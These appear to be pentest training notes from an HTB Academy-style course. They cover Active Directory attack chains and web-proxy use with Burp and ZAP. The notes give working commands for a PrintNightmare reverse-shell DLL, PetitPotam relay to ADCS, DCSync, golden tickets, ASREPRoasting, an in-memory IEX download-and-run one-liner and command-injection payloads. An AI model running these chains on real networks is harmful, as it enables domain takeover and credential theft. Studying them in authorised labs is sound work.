🖨️ PrintNightmare (CVE-2021-1675)

Remote Code Execution via the Windows Print Spooler service. Allows any authenticated user to execute code as SYSTEM on any Windows host with the Spooler running (including DCs).

# Clone the exploit
git clone https://github.com/cube0x0/CVE2021-1675.git

# Install the required Impacket version (must use cube0x0's fork)
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
# → The exploit requires a specific Impacket version

# Check if target has MS-RPRN or MS-PAR exposed (vulnerable)
rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
# → MS-RPRN = MS-RPRN (Print System Remote Protocol) = vulnerable
# → MS-PAR = MS-PAR (Print System Asynchronous Remote Protocol) = also vulnerable
# NEXT: If either protocol is exposed, proceed with exploit

# Generate malicious DLL payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.129.202.111 LPORT=8080 -f dll > backupscript.dll
# → Creates a DLL that calls back to our listener
# → The exploit will load this DLL on the target as SYSTEM
# NEXT: Host the DLL and set up listener

# Host the DLL via SMB server
sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
# → Creates SMB share the target will connect to for the DLL

# Execute the exploit
sudo python3 CVE-2021-1675.py inlanefreight.local/<username>:<password>@172.16.5.5 '\\10.129.202.111\CompData\backupscript.dll'
# → Loads our DLL into the Spooler on the DC
# → DLL executes as SYSTEM = Meterpreter session as SYSTEM
# NEXT: Use SYSTEM access to dump credentials with Mimikatz

# Check if Spooler is running (from Windows)
Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# → TRUE = Spooler is running = potentially vulnerable

🧲 PetitPotam (MS-EFSRPC — CVE-2021-36942)

Coerces Windows hosts to authenticate to a controlled machine using MS-EFSRPC. When combined with NTLM relay to ADCS (Active Directory Certificate Services), you can get a certificate for the DC — then forge TGTs and DCSync.

Attack chain: PetitPotam → NTLM Relay to ADCS → Certificate → TGT for DC → Pass-the-Ticket → DCSync

# Step 1: Set up NTLM relay to ADCS web enrollment
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
# → Listens for incoming NTLM auth, relays to ADCS
# → --adcs = ADCS relay mode | --template = certificate template to use
# → DomainController template = certificate usable for DC auth
# NEXT: Trigger DC to authenticate to us

# Step 2: Clone and run PetitPotam
git clone https://github.com/topotam/PetitPotam.git
python3 PetitPotam.py 172.16.5.225 172.16.5.5
# → 172.16.5.225 = our attack host (where ntlmrelayx is running)
# → 172.16.5.5 = target DC (forced to authenticate to us)
# → If successful, ntlmrelayx captures auth and gets a base64 certificate
# NEXT: Use the certificate to request a TGT

# Step 3: Request TGT using the certificate (PKINIT)
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <base64 certificate> = dc01.ccache
# → Uses PKINIT to authenticate with the certificate and get a TGT
# → Saves TGT to dc01.ccache file
# NEXT: Use TGT for DCSync

# Step 4: Set environment variable for Kerberos ticket
export KRB5CCNAME=dc01.ccache
# → Tells Kerberos tools to use this ticket cache

# Step 5: View the ticket
klist krb5-user

# Step 6: DCSync using the DC's TGT
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# → -k = use Kerberos auth | -no-pass = use ticket cache
# → Performs DCSync as the DC itself — gets all hashes
# NEXT: Crack hashes or use for pass-the-hash

# Alternative: Get NT hash from TGT
python /opt/PKINITtools/getnthash.py -key <AS-REP encryption key> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
# → Extracts NT hash from TGT using the AS-REP key
# NEXT: Use NT hash for pass-the-hash attacks

# Perform DCSync with NT hash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba

# From Windows with Rubeus — PTT with certificate
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /<base64 certificate>=/ptt
# → Requests TGT from the certificate and injects into session (pass-the-ticket)
# NEXT: Run Mimikatz DCSync after PTT

# Mimikatz DCSync after ticket injection
mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt

🔧 Miscellaneous Misconfigurations

MS-PRN Printer Bug

Import-Module .\SecurityAssessment.ps1
Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
# → Check if Print Spooler is running (potential PrintNightmare / coercion vector)

DNS Record Enumeration (adidnsdump)

# Dump all DNS records via LDAP
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5
# → Resolves all DNS records in the zone
# → May reveal internal hosts not publicly visible
# NEXT: Note any interesting hosts (DB servers, dev boxes, etc.)

# Also resolve unknown records
adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r
# → -r = perform A record queries for unknown hosts
# → More comprehensive — finds hosts with forward-only records

Descriptions Field — Credential Hunting

# Users sometimes store passwords in the Description field
Get-DomainUser * | Select-Object samaccountname,description
# → Returns all users and their description field
# → Look for: passwords, service account notes, credentials
# NEXT: Try any found passwords against the associated account

# Check for accounts with no password required (PASSWD_NOTREQD)
Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol
# → PASSWD_NOTREQD = account can have blank password
# → Try authenticating with empty password

SYSVOL Share — Credential Hunting

# List SYSVOL scripts folder
ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts
# → Old scripts, batch files, VBS often contain hardcoded credentials
# NEXT: Download and review all scripts for credentials

📋 Group Policy Enumeration & Attacks

GPP (Group Policy Preferences) Password Vulnerability

Older group policies stored passwords in XML files in SYSVOL, encrypted with AES-256. Microsoft published the AES key in 2012, making decryption trivial.

# Decrypt a captured GPP password
gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE
# → Decrypts the AES-256 encrypted password stored in Groups.xml or other GPP files
# → Returns: cleartext password
# NEXT: Try the password against domain accounts

# Find GPP passwords with CrackMapExec
crackmapexec smb -L | grep gpp
# → Lists CrackMapExec modules related to GPP
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin
# → Searches SYSVOL for autologon credentials stored in GPP
# → Returns: username and decrypted password if found

GPO Enumeration & Abuse

# List all GPO names
Get-DomainGPO | select displayname
# → All Group Policy Objects in the domain

# Enumerate GPOs using built-in PowerShell
Get-GPO -All | Select DisplayName

# Check if Domain Users have rights over any GPOs
$sid = Convert-NameToSid "Domain Users"
Get-DomainGPO | Get-ObjectAcl | ? {$_.SecurityIdentifier -eq $sid}
# → Domain Users having rights over a GPO = potential privilege escalation
# → If you can edit a GPO applied to a machine/OU, you can push malicious settings

# Get GPO name from GUID
Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532
# → Converts GUID to readable GPO name
# → Useful when reviewing ACL output that shows GUIDs

💫 ASREPRoasting

Targets accounts with "Do not require Kerberos preauthentication" set. Without pre-auth, any user can request an AS-REP encrypted with the target's hash — and crack it offline.

Key Difference from Kerberoasting

Kerberoasting ASREPRoasting
Target Service accounts with SPNs Any account with pre-auth disabled
Hash type TGS-REP (krb5tgs) AS-REP (krb5asrep)
Creds required Any domain user None (can be done anonymously if you have usernames)
Hashcat mode 13100 18200 
# Find accounts with DONT_REQ_PREAUTH flag (Windows)
Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl
# → DONT_REQ_PREAUTH = Kerberos pre-auth disabled = ASREPRoastable
# NEXT: Request AS-REP for each vulnerable account

# Request AS-REP and format for Hashcat
.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat
# → /user = target account | /nowrap = don't wrap hash | /format:hashcat = Hashcat format
# → Returns $krb5asrep$23$... hash
# NEXT: Crack with Hashcat

# Crack with Hashcat
hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt
# → -m 18200 = Kerberos AS-REP hash mode
# NEXT: Use cracked password for access

# From Linux without credentials — if you have usernames
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
# → Kerbrute automatically retrieves AS-REP for accounts without pre-auth
# → During username enumeration, it detects and prints ASREPRoastable accounts
# → Hashes printed in crackable format
# NEXT: Feed hashes to Hashcat

🌳 Trust Relationships — Child to Parent Domains

Domain trusts allow authentication across domain boundaries. Child → Parent trusts are created automatically when a child domain is added to a forest. They're bidirectional and transitive by default.

🎯 Goal Compromise the child domain → escalate to the parent domain (entire forest).

Method: Golden Ticket with SID History — use KRBTGT hash + child domain SID + Enterprise Admins SID to create a cross-domain Golden Ticket.

# Enumerate trust relationships
Import-Module activedirectory
Get-ADTrust -Filter *
# → Shows: trust type (Parent-Child, External, Forest), direction, SID filtering

Get-DomainTrust           # PowerView equivalent
Get-DomainTrustMapping    # Maps all trusts reachable from current domain

# Enumerate users in the child domain
Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName
# → What users exist in the child domain?

# Get child domain SID
Get-DomainSID
# → Returns SID for current (child) domain — needed for Golden Ticket

# Get Enterprise Admins group SID from parent domain
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
# → Enterprise Admins = highest privilege group in the forest
# → Its SID goes into the /sids parameter of the Golden Ticket

# Test if we can access parent DC
ls \\academy-ea-dc01.inlanefreight.local\c$
# → Should fail before Golden Ticket, succeed after

Getting Child KRBTGT Hash

# DCSync the child domain KRBTGT
mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt
# → Gets KRBTGT hash for the child domain (LOGISTICS)
# → This is used to forge the Golden Ticket

# From Linux
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
# → DCSync for child domain KRBTGT from Linux

Create Golden Ticket (Mimikatz)

mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
# → /user = fake user (any name)
# → /domain = child domain
# → /sid = child domain SID
# → /krbtgt = child domain KRBTGT NT hash
# → /sids = Enterprise Admins SID from parent domain (add -519 = EA group RID)
# → /ptt = pass-the-ticket (inject into current session)
# NEXT: Access parent domain resources as Enterprise Admin

Create Golden Ticket (Rubeus)

.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
# → Same parameters as Mimikatz, Rubeus syntax

From Linux (Impacket)

# Get SID info
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
# → SID brute-forcing — enumerates all SIDs

lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"
# → Get the child domain SID

lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
# → Get parent domain SID + Enterprise Admins RID
# → Note the SID before the -519

# Create Golden Ticket
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
# → Creates hacker.ccache (the Golden Ticket)

# Set ticket environment variable
export KRB5CCNAME=hacker.ccache

# Access parent DC using Golden Ticket
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
# → -k = Kerberos auth | -no-pass = use ticket from cache
# → SYSTEM shell on parent DC!

# Automatic child→parent escalation (one command)
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
# → Automatically performs entire child-to-parent escalation
# → Gives shell on parent DC

🌲 Trust Relationships — Cross-Forest

A separate forest (FREIGHTLOGISTICS.LOCAL) has an external trust with INLANEFREIGHT.LOCAL. Cross-forest attacks are possible if the trust is bidirectional or if we can kerberoast across the trust boundary.

# Enumerate SPNs in the trusted forest
Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
# → List SPN accounts in FREIGHTLOGISTICS.LOCAL
# NEXT: Kerberoast those accounts

# Get details on a specific account
Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof
# → What groups is the mssqlsvc account in?
# → If it's in a privileged group in FREIGHTLOGISTICS.LOCAL = high value target

# Kerberoast across the forest trust
.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
# → Requests TGS for mssqlsvc in the trusted forest
# NEXT: Crack TGS with Hashcat

# Find foreign group members (users from INLANEFREIGHT in FREIGHTLOGISTICS groups)
Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
# → Users from INLANEFREIGHT.LOCAL who are members of FREIGHTLOGISTICS.LOCAL groups
# → These users may have elevated access in the trusted forest
# NEXT: If any INLANEFREIGHT admins are in FREIGHTLOGISTICS admin groups = direct path

# Use that trust to access the other forest
Enter-PSSession -ComputerName ACADEMY-EADC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
# → If the trust allows it, INLANEFREIGHT admin can authenticate to FREIGHTLOGISTICS DC

# From Linux — cross-forest Kerberoasting
GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley
# → -target-domain = the trusted forest | INLANEFREIGHT.LOCAL/wley = our creds
# → Gets TGS for SPN accounts in FREIGHTLOGISTICS.LOCAL
# NEXT: Crack TGS, access FREIGHTLOGISTICS resources

📁 Transferring Files

When you need to move tools or data between attack host and target.

# Host a file on a quick HTTP server (Linux)
sudo python3 -m http.server 8001
# → Serves current directory on port 8001
# → Target can download with: Invoke-WebRequest, curl, wget, certutil

# Download file from web server (Windows one-liner)
"IEX(New-Object Net.WebClient).downloadString('http://172.16.5.222/SharpHound.exe')"
# → Downloads and executes in memory (fileless)
# → Or: Invoke-WebRequest http://IP/tool.exe -OutFile tool.exe

# Host files via Impacket SMB server
impacket-smbserver -ip 172.16.5.x -smb2support -username user -password password shared /home/administrator/Downloads/
# → Creates SMB share pointing to local Downloads folder
# → Target accesses via: \\172.16.5.x\shared\file.exe
# → -smb2support = enables SMBv2 (required for newer Windows)
# → -username/-password = optional auth (use to avoid unauthorized access)

Event ID Description Triggered By

Web Applications/Module 14

Using Web Proxies

🔍 What Are Web Proxies

Web proxies are man-in-the-middle (MITM) tools that sit between your browser and the backend server. They capture, display, and allow modification of all HTTP/HTTPS traffic passing through them.

Why use them?

  • Modern web apps rely heavily on backend servers → testing backend behavior is critical
  • They let you see exactly what's being sent and received
  • Unlike tools like Wireshark (which sniff all network traffic), web proxies focus specifically on HTTP/80 and HTTPS/443
  • They are considered among the most essential tools for any web penetration tester

What can you do with them?

Use Case Description
Request capture & replay See and resend any HTTP request
Web fuzzing Automate testing of parameters, directories, etc.
Web crawling Map the full structure of a web app
Web app mapping Understand the app's attack surface
Request analysis Understand what data is being sent
Configuration testing Check headers, cookies, parameters
Code reviews Inspect JS/HTML from responses

🛠️ Tools Overview

Burp Suite

  • Pronunciation: "Burp Sweet"
  • Most widely used web proxy for pentesting
  • Has a built-in Chromium browser (pre-configured for proxying)
  • Community (free) version is throttled but powerful
  • Pro/Enterprise version unlocks:
  • Active Web App Scanner
  • Fast Burp Intruder (unlimited speed)
  • Ability to load certain Burp Extensions
  • Pro trial: Educational/business email → https://portswigger.net/burp/pro
  • Download: https://portswigger.net/burp/releases

OWASP ZAP (Zed Attack Proxy)

  • Free and open-source — no paid tier, no throttling
  • Initiated by OWASP (Open Web Application Security Project)
  • Growing community; gaining many Burp Pro features for free
  • Great for scans without budget constraints
  • Download: https://www.zaproxy.org/download/

When to use which?
→ ZAP for unlimited free scans and fuzzing
→ Burp Pro for advanced/corporate pentests with mature tooling
→ Both together for maximum coverage

⚙️ Setting Up

Burp Suite Installation

Both tools require Java Runtime Environment (JRE) — usually bundled with the installer.

# Run Burp from terminal (JAR method)
java -jar /path/to/burpsuite.jar

# Or launch from application menu / terminal shortcut
burpsuite

Why use the JAR? Works cross-platform on any OS with Java installed.

Startup steps:
1. Launch Burp → prompted to create a project
2. Community version: only "Temporary project" (no saving progress)
3. Pro version: can save/open existing projects
4. Select "Use Burp Defaults" → click Start Burp

💡 Save your project only when doing long engagements or running Active Web Scans on large apps.

ZAP Installation

# Launch ZAP from terminal
zaproxy

# Or use application menu

Startup steps:
1. ZAP prompts: "Do you want to persist the ZAP session?"
2. Choose "No" for temporary session (suitable for most cases)
3. ZAP is now running

Dark Theme (both tools)

  • Burp: User Options > Display → set theme to "Dark"
  • ZAP: Tools > Options > Display → set Look and Feel to "Flat Dark"

🔌 Proxy Setup & Browser Config

Both tools listen on port 8080 by default (localhost: 127.0.0.1:8080).

To change port: Burp → Proxy > Options | ZAP → Tools > Options > Local Proxies

Option 1: Pre-Configured Browser (Easiest)

Both tools ship with a browser that's already set up — no manual proxy config needed.

  • Burp: Proxy > Intercept → click "Open Browser"
  • ZAP: Click the Firefox icon at the end of the top bar

Option 2: FoxyProxy Extension (Recommended for real Firefox)

FoxyProxy lets you quickly toggle proxy settings in Firefox without going into Settings manually.

Install: https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/

Config steps:
1. Click FoxyProxy icon → Options
2. Click Add (left pane)
3. Set:
- IP: 127.0.0.1
- Port: 8080
- Name: Burp or ZAP
4. Save → Click FoxyProxy icon → Select Burp/ZAP

PwnBox already has this configured — skip if using PwnBox.

🔐 Installing CA Certificates

Why? Without the proxy's CA cert, HTTPS traffic won't route properly — Firefox will throw errors or block connections.

Burp CA Certificate

  1. With Burp set as proxy in FoxyProxy, browse to: http://burp
  2. Click "CA Certificate" to download cacert.der

ZAP CA Certificate

  1. Go to: Tools > Options > Dynamic SSL Certificate
  2. Click "Save" to export the certificate
  3. Can also generate a new one with "Generate"

Installing in Firefox

  1. Go to: about:preferences#privacy
  2. Scroll to bottom → click "View Certificates"
  3. Select "Authorities" tab → click "Import"
  4. Select the downloaded .der or .pem file
  5. Check both:
    - ✅ Trust this CA to identify websites
    - ✅ Trust this CA to identify email users
  6. Click OK

After this, all Firefox HTTPS traffic routes cleanly through the proxy.

🎯 Intercepting Web Requests

Burp — Intercepting

  1. Go to Proxy > Intercept tab
  2. Toggle "Intercept is on" (green = intercepting)
  3. Open pre-configured browser → visit your target
  4. Burp will pause the request and display it — click "Forward" to send it through

If you see unrelated requests intercepted first, keep clicking Forward until you reach your target IP/request.

ZAP — Intercepting

  • Interception is OFF by default (green button = requests pass through freely)
  • Toggle with: CTRL+B
  • Intercepted request appears in top-right pane
  • Click "Step" (right of the red break button) to forward

ZAP HUD (Heads Up Display)

  • ZAP's unique in-browser control panel
  • Enable: click the HUD button at the end of ZAP's top menu bar
  • To intercept from HUD: click the 2nd button on the left pane (intercept toggle)
  • Intercepted request shown in an overlay — choose:
  • Step → sends request, intercepts next
  • Continue → sends all remaining requests through

💡 First time using pre-configured ZAP browser? A HUD tutorial will appear. Take it — it's helpful. If you miss it: click config button (bottom-right) → "Take the HUD tutorial".

✏️ Manipulating Intercepted Requests

Once a request is intercepted, it hangs until you act. This is where the power of web proxies becomes clear.

What you can test by modifying requests:

Vulnerability Type What you manipulate
SQL Injection Parameter values in GET/POST
Command Injection Input fields sent to backend
Upload Bypass File type/extension in upload requests
Authentication Bypass Cookies, session tokens
XSS Reflected parameters
XXE XML body content
Error Handling Invalid/unexpected input
Deserialization Serialized object parameters

Practical Example — Command Injection

Scenario: A web app has a "Ping Your IP" form. The browser enforces numeric-only input via JavaScript. But we can bypass that entirely using the proxy.

Intercepted POST request:

POST /ping HTTP/1.1
Host: 46.101.23.188:30820
Content-Type: application/x-www-form-urlencoded
...
ip=1

What we do:
- Change ip=1 → ip=;ls;
- Click Forward (Burp) or Continue (ZAP)

What happens:
- The server executes ls and returns directory listing
- This proves the backend doesn't validate input — command injection confirmed

Why it works:
- JavaScript validation only runs client-side (in the browser)
- By intercepting after the browser but before the server, we bypass all client-side restrictions
- The backend receives our raw input and executes it

⚠️ This is "breaking" the request flow to test the app — not damaging it. The goal is to see if the backend validates input independently.

📥 Intercepting Responses

Sometimes you need to modify the server's response before it reaches the browser — for example to:
- Enable disabled input fields
- Show hidden form fields
- Remove field restrictions like maxlength

Burp — Response Interception

  1. Go to: Proxy > Options
  2. Under "Intercept Server Responses" → enable "Intercept responses based on the following rules"
  3. Force-refresh page: CTRL+SHIFT+R in Firefox
  4. Forward the request → the response is now intercepted

Example: Change type="number" → type="text" on the input field, and maxlength="3" → maxlength="100" to allow arbitrary input directly in the browser.

<!-- Before -->
<input type="number" id="ip" name="ip" min="1" max="255" maxlength="3" ...>

<!-- After (modified in Burp) -->
<input type="text" id="ip" name="ip" min="1" max="255" maxlength="100" ...>

ZAP — Response Interception

  • In ZAP, click "Step" after intercepting a request → it forwards the request and automatically intercepts the response
  • Modify the response body → click Continue

ZAP HUD Shortcut — Show/Enable Fields

  • If you just want to enable disabled fields (without intercepting responses):
  • Click the 3rd button on the left pane (light bulb icon)

  • ZAP will auto-enable all disabled/hidden fields on the page without needing to intercept anything

  • Comments button (+ button on left pane → select Comments): Highlights HTML comment positions on the live page — hover to see content

Burp Equivalent

  • Proxy > Options > Response Modification → options like "Unhide hidden form fields"

🔄 Automatic Modification (Match & Replace)

Instead of manually modifying every request/response, set rules to auto-apply changes to all matching traffic.

Burp — Match and Replace

Navigate to: Proxy > Options > Match and Replace → click Add

Example: Replace User-Agent header automatically

Field Value
Type Request header
Match ^User-Agent.*$ (regex — matches the whole User-Agent line)
Replace User-Agent: HackTheBox Agent 1.0
Regex match ✅ True

Why use this? Some servers filter or behave differently based on User-Agent strings. Replacing it lets you bypass User-Agent based filters or impersonate other clients.

Example: Auto-modify response to enable input fields

Field Value
Type Response body
Match type="number"
Replace type="text"
Regex match ❌ False

Add another rule: maxlength="3" → maxlength="100" for length bypass.

Now every time the page loads, the input field will accept text automatically — persistent across page refreshes.

ZAP — Replacer

Navigate to: CTRL+R or Tools > Options > Replacer → click Add

Field Value
Description HTB User-Agent
Match Type Request Header (will add if not present)
Match String User-Agent
Replacement String HackTheBox Agent 1.0
Enable ✅ True
  • Initiators tab: Control which traffic types the replacement applies to (default: all HTTP/S messages)
  • Also supports Request Header String with Regex pattern matching

🔁 Repeating Requests

Why? After finding a command injection, running every new command by re-intercepting, modifying, and forwarding would take forever. Request repeating lets you resend a prior request with quick edits directly inside the tool.

Proxy History

  • Burp: Proxy > HTTP History
  • ZAP HUD: Bottom History pane
  • ZAP UI: Bottom History tab

Both support filtering and sorting. Both also maintain WebSockets history (async connections).

Burp Repeater

  1. Find request in Proxy History
  2. Press CTRL+R → sends to Repeater tab
  3. Press CTRL+SHIFT+R → jumps to Repeater
  4. Modify request → click "Send"
  5. Response shown immediately in the right pane

💡 Right-click → "Change Request Method" to switch between GET/POST without rewriting the request.

Example:

ip=1        → Original (ping command)
ip=1;ls;-la → Modified (lists files with details)

Change the value → click Send → see command output in the response.

ZAP Request Editor

  1. Right-click request in History → "Open/Resend with Request Editor"
  2. Modify → click "Send"
  3. Method drop-down lets you switch HTTP methods

ZAP HUD Repeat

  1. Click request in bottom History pane
  2. Request Editor opens in HUD
  3. Choose:
    - Replay in Console → response shown in HUD overlay
    - Replay in Browser → response rendered in the browser

Burp tip: Shows both "Original Request" and "Edited Request" — click the pane header to switch. ZAP shows only the final sent version.

🔢 Encoding & Decoding

When crafting custom requests, you'll frequently need to encode/decode data.

URL Encoding — Key Characters

Character Why it must be encoded
Space Indicates end of request data if unencoded
& Interpreted as a parameter delimiter
# Interpreted as a fragment identifier

In Burp Repeater:
- Select text → right-click → Convert Selection > URL > URL encode key characters
- Or select text → CTRL+U to URL encode
- CTRL+SHIFT+U to URL decode
- Enable "URL-encode as you type" via right-click for automatic encoding

In ZAP:
- Automatically URL-encodes request data in the background before sending

Other Encoding Types Supported

Type Use Case
HTML Encoding special HTML characters
Unicode Unicode representation of characters
Base64 Encoding binary or session data
ASCII Hex Hex representation of bytes

Burp Decoder

  • Access: Decoder tab in Burp
  • Paste text → select "Decode as > Base64" (or any encoder)
  • Output pane can be chained: encode/decode output further by selecting another method in the bottom pane

Example — Decode a session cookie:

eyJ1c2VybmFtZSI6Imd1ZXN0IiwgImlzX2FkbWluIjpmYWxzZX0=

→ Decoded: {"username":"guest", "is_admin":false}

Now test privilege escalation:
1. Change guest → admin, false → true
2. Re-encode as Base64: eyJ1c2VybmFtZSI6ImFkbWluIiwgImlzX2FkbWluIjp0cnVlfQ==
3. Replace the cookie value in Burp Repeater → send request
4. See if the server grants admin access

Burp Inspector

  • Available in Burp Proxy and Repeater panels (right side)
  • Automatically detects and decodes selected text
  • Shows URL-decoded, Base64-decoded versions side-by-side

ZAP Encoder/Decoder/Hash

  • Access: CTRL+E
  • Tabs: Encode | Decode | Hash | Illegal UTF8 | Unicode
  • Paste text → all decodings shown simultaneously
  • Create custom tabs: "Add New Tab" → add specific encoders you need

💻 Proxying Tools (CLI)

Web proxies aren't just for browsers — you can route any tool's traffic through them for full visibility and interception.

⚠️ Proxying slows tools down — only enable it when you need to inspect traffic.

Method: Set proxy to http://127.0.0.1:8080 in the tool's config

Proxychains

What it is: A Linux tool that forces any command-line tool's traffic through a proxy.

Setup:

# Edit proxychains config
sudo nano /etc/proxychains.conf

# Comment out the default socks4 line:
# socks4  127.0.0.1 9050

# Add at the end:
http 127.0.0.1 8080

# Also uncomment to reduce noise:
quiet_mode

Usage:

# Prepend proxychains to any command
proxychains curl http://TARGET_IP:PORT

# What you'll see:
# ProxyChains-3.1 (http://proxychains.sf.net)
# [response HTML here]
⚡ Why use it Every request made by curl, wget, or any other CLI tool now flows through Burp/ZAP. You can see, intercept, and modify it just like browser traffic.

What to look for in proxy: You'll see the raw request in Burp's Proxy History — check headers, parameters, and body for vulnerabilities.

Nmap via Proxy

# Check nmap proxy options
nmap -h | grep -i prox
# Output: --proxies <url1,[url2],...>: Relay connections through HTTP/SOCKS4 proxies

# Run nmap through proxy
nmap --proxies http://127.0.0.1:8080 TARGET_IP -pPORT -Pn -sC
Flag Reason
--proxies Routes nmap traffic through the proxy
-Pn Skips host discovery (required with proxy, as recommended in man page)
-sC Runs default scripts — good to observe what they send

⚠️ Nmap's built-in proxy support is still experimental — not all traffic may route through. Fall back to proxychains if needed.

Metasploit via Proxy

# Start Metasploit
msfconsole

# Select a module
msf6 > use auxiliary/scanner/http/robots_txt

# Set proxy
msf6 auxiliary(scanner/http/robots_txt) > set PROXIES HTTP:127.0.0.1:8080

# Set target
msf6 auxiliary(scanner/http/robots_txt) > set RHOST TARGET_IP
msf6 auxiliary(scanner/http/robots_txt) > set RPORT PORT

# Run
msf6 auxiliary(scanner/http/robots_txt) > run

Why: Lets you see every request a Metasploit module sends — useful for debugging, verifying exploits work correctly, or modifying payloads mid-flight.

🔍 What to look for Check Burp/ZAP Proxy History for all requests made by the module. You can replay, modify, or analyze them.

🎯 Burp Intruder — Fuzzing

Burp Intruder is Burp's built-in web fuzzer. Think of it as a GUI-based ffuf or gobuster but deeply integrated with the proxy.

⚠️ Community (free) version is throttled to 1 request/second — very slow. Pro version has unlimited speed. For free fuzzing without throttling, use ZAP Fuzzer.

Send to Intruder

  1. Find request in Proxy History
  2. Right-click → "Send to Intruder" or press CTRL+I
  3. Open Intruder tab with CTRL+SHIFT+I

Tab 1 — Target

  • Displays the target host/port auto-populated from the captured request
  • Verify this is correct before proceeding

Tab 2 — Positions

This is where you define where your payloads will be inserted.

Attack Types:
| Type | Description |
|---|---|
| Sniper | Single payload set, one position at a time (most common) |
| Battering Ram | Same payload inserted into all positions simultaneously |
| Pitchfork | Multiple payload sets, one per position (paired) |
| Cluster Bomb | Multiple payload sets, all combinations tested |

Marking payload position:
- Select the word you want to fuzz → click "Add §"
- Or manually wrap: §DIRECTORY§
- The marker name (e.g., DIRECTORY) can be anything — it's just a label

Example — Directory fuzzing:

GET /§DIRECTORY§/ HTTP/1.1
Host: target.com

→ Intruder will replace §DIRECTORY§ with each word from your wordlist

Tab 3 — Payloads

Payload Sets:
- Set number corresponds to position number
- Select payload type for each set

Payload Types:
| Type | Use Case |
|---|---|
| Simple List | Basic wordlist — iterate over each line |
| Runtime file | Load wordlist line-by-line (memory efficient for huge lists) |
| Character Substitution | Specify char substitutions — Intruder tries all permutations |
| Numberzz / Numbers | Generate numeric sequences |

Loading a wordlist:
- Click "Load" → select file
- Example: /opt/useful/seclists/Discovery/Web-Content/common.txt
- SecLists repo: https://github.com/danielmiessler/SecLists

💡 For huge wordlists, use "Runtime file" instead of "Simple List" to avoid memory issues.

Payload Processing (filters on wordlist):
- Click "Add" → choose a rule type
- Example: Skip if matches regex → ^\\..*$ → skips all lines starting with .
- Other rules: Add prefix, Add suffix, URL-encode, Hash, etc.

Payload Encoding:
- Bottom of Payloads tab
- Enables URL-encoding of payloads before insertion (leave enabled by default)

Tab 4 — Options

Grep - Match (useful for directory fuzzing):
1. Enable "Grep - Match"
2. Clear existing entries → click "Clear"
3. Type 200 OK → click "Add"
4. Uncheck "Exclude HTTP Headers" (so it matches the status line)
5. Results with 200 OK will be flagged with a checkmark

Grep - Extract:
